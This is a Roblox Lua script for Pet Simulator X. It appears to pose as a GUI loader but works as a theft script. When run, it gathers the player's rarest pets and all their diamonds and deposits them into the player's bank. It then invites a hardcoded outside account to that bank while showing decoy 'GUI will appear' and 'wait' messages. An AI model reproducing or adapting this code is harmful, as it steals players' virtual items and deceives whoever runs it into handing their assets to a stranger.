local LocalNumber = 1463952395
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];
	if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
		table.insert(PetsList, v.uid);
	end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if request then
	lib.Message.New("Wait 45 seconds");
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
	lib.Message.New("Pet Simulator X gui will appear after 30sec");
else
	lib.Message.New("Wait 30 seconds");
end;
